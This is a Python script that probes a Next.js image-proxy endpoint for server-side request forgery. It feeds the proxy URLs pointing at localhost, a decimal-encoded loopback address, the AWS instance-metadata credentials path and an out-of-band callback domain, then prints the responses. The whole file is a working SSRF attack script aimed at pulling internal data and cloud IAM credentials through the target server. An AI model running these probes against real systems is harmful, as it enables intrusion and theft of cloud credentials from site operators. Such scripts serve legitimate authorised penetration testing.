#!/usr/bin/env python3
import sys, re, time
sys.path.insert(0,'/work')
import icp
from urllib.parse import quote

REAL = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"

def clean(b):
    t = b.decode('utf-8','replace')
    t = re.sub(r'<script.*?</script>','',t,flags=re.S)
    t = re.sub(r'<style.*?</style>','',t,flags=re.S)
    t = re.sub(r'<[^>]+>',' ',t)
    return re.sub(r'\s+',' ',t).strip()[:400]

CASES = [
 ("valid-cached",  REAL),
 ("no-cache-bust", REAL + '?cb=90210'),
 ("localhost",     "http://localhost:3000/"),
 ("loopback",      "http://127.0.0.1:3000/"),
 ("dns-oob",       "http://oobe6c32b7155cd.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf-plain"),
 ("aws-metadata",  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
 ("v4dword",       "http://2130706433/"),
]
for label, url in CASES:
    q = '/_next/image?url=' + quote(url, safe='') + '&w=1080&q=75'
    c,b,h = icp.fetch(q, out='/tmp/i_%s.bin'%label)
    ct = [l.split(': ',1)[1] for l in h.splitlines() if l.lower().startswith('content-type')]
    age = [l for l in h.splitlines() if l.lower().startswith('age')]
    print("%-14s code=%s len=%-7d ct=%s %s\n     %s" % (label,c,len(b),ct,age,clean(b)[:250]))
    time.sleep(1.5)
